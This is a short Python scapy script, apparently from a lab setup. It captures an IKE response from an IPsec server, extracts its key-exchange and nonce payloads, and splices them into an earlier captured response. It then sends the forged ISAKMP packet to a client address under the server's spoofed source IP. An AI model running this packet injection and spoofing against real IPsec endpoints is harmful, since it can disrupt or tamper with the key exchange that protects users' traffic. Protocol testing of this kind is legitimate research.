#!/usr/local/bin/python
from scapy.all import *
ipsec_server = "192.168.56.102"
#ipsec_server = "192.168.84.128"
ue_addr = "10.0.0.190"

##### Phase 2 #####

# capturing response pk from swan server to UE
#packet2=sniff(iface="vmnet8", filter="udp and port 500", count=2, prn=lambda x: x.summary)
packet2=sniff(iface="vboxnet0", filter="udp and port 500", count=2)

# storing 2nd response pk from swan ipsec server
data3 = ""
tlayer3 =packet2[1].getlayer(UDP)	
if packet2[1].getlayer(ISAKMP):	
#if packet2[1].getlayer(Raw):	
   data3 += str(tlayer3.payload) #assemble the packet

wrpcap("data3.pcap", packet2[1])  # overall packet 

"""
f = open("raw_data3.dat", 'w')
f.write(data3)
f.close()
"""

#Packetizing data3 + data2
#extracting key and nonce from data3

new_key=""
new_nonce=""
pk = rdpcap("data3.pcap")
new_key=pk[0][ISAKMP].payload.payload.load
new_nonce=pk[0][ISAKMP].payload.payload.payload.load


#replace privious response with extracted key and nonce.
pkts = rdpcap("data2.pcap")

pp = ISAKMP(data3)  #payload only
#pp = ISAKMP(pkts[0])  #payload only

pp[0].payload.payload.load = new_key
pp[0].payload.payload.payload.load = new_nonce

# cert req payload
"""
pp[0].length = '\x00\x00\x01\x7b'
pp[0].length = 0x149
pp[0].payload.payload.payload.payload.payload.next_payload = 0x26
pp[0].payload.payload.payload.payload.payload.payload.length = 0x19
pp[0].payload.payload.payload.payload.payload.payload.load = '\x04\x0a\x5e\x09\x6a\x86\x66\x05\xc7\xc4\x83\x3d\xa4\xd6\x1b\xb1\x12\x23\x2a\x77\x38'
"""

#print "pp"
#hexdump(pp[0].payload.payload.load)


#packetizing: original 1st response pkts + new key and nonce

data4 = ""
tlayer =pkts[0].getlayer(UDP)	
if pkts[0].getlayer(Raw):	
   data4 += str(pp[0])

#send(IP(dst="10.0.0.30")/UDP()/ISAKMP(data3))
send(IP(dst=ue_addr, src=pkts[0][IP].src)/UDP(dport=pkts[0].dport)/ISAKMP(data4))
#send(IP(dst=ue_addr, src=pkts[0][IP].src)/UDP(dport=pkts[0].dport)/ISAKMP(data4))


